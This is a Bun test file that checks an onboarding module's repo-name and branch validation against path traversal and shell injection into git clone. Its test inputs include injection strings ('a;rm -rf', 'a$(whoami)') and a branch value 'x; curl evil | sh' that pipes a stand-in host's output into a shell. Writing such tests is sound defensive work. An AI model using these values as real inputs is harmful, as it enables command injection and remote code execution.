// Onboarding repo-name / branch validation + repoDir traversal guard.
// These back the security fix: repo names become a path segment under reposDir
// and are interpolated into `git clone`, so a crafted name/branch must not be
// able to traverse out of reposDir or inject a shell command.
//
// assertRepoName is pure (no cfg) so it runs in-process; repoDir/addRepo touch
// cfg.reposDir + write repos.json, so they run in a child with an isolated dir.
import { test, expect } from 'bun:test';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { runInChild } from './_child.js';

const onb = await import('../server/onboarding.js');

test('assertRepoName accepts safe leaf names', () => {
  for (const n of ['app', 'my-repo', 'repo.v2', 'a_b', 'MixedCase123'])
    expect(onb.assertRepoName(n)).toBe(n);
});

test('assertRepoName rejects traversal, separators, and shell metacharacters', () => {
  for (const bad of ['..', '.', '../evil', 'a/b', 'a\\b', 'a;rm -rf', 'a$(whoami)', 'a`id`', 'a b', '', 'a|b', 'a&b']) {
    expect(() => onb.assertRepoName(bad)).toThrow();
  }
});

test('repoDir stays under reposDir; escaping names throw (isolated child)', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'arigami-onb-'));
  const repos = path.join(dir, 'repos');
  const r = runInChild(
    "const onb=await import('./server/onboarding.js');const path=await import('node:path');" +
      "const base=path.resolve(process.env.ARIGAMI_REPOS_DIR);" +
      "const good=onb.repoDir({name:'safe-repo',source:'github.com/o/r'});" +
      "let escaped=false;try{onb.repoDir({name:'../escape',source:'x'});}catch{escaped=true;}" +
      "let sep=false;try{onb.repoDir({name:'a/b',source:'x'});}catch{sep=true;}" +
      "emit({dirname:path.dirname(good),base,good,escaped,sep});",
    { ARIGAMI_DIR: path.join(dir, 'cfg'), ARIGAMI_REPOS_DIR: repos }
  );
  expect(r.ok).toBe(true);
  const o = r.out[0];
  expect(o.dirname).toBe(o.base);
  expect(o.good).toBe(path.join(o.base, 'safe-repo'));
  expect(o.escaped).toBe(true);
  expect(o.sep).toBe(true);
});

test('addRepo rejects an invalid name and an injecting branch (isolated child)', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'arigami-onb2-'));
  const r = runInChild(
    "const onb=await import('./server/onboarding.js');" +
      "let badName=false;try{onb.addRepo({name:'a;b',source:'github.com/o/r'});}catch{badName=true;}" +
      "let badBranch=false;try{onb.addRepo({name:'ok-repo',source:'github.com/o/r',branch:'x; curl evil | sh'});}catch(e){badBranch=/branch/i.test(String(e.message));}" +
      "const saved=onb.addRepo({name:'clean-repo',source:'github.com/o/r',branch:'main'});" +
      "emit({badName,badBranch,savedName:saved.name});",
    { ARIGAMI_DIR: path.join(dir, 'cfg'), ARIGAMI_REPOS_DIR: path.join(dir, 'repos') }
  );
  expect(r.ok).toBe(true);
  expect(r.out[0].badName).toBe(true);
  expect(r.out[0].badBranch).toBe(true);
  expect(r.out[0].savedName).toBe('clean-repo');
});
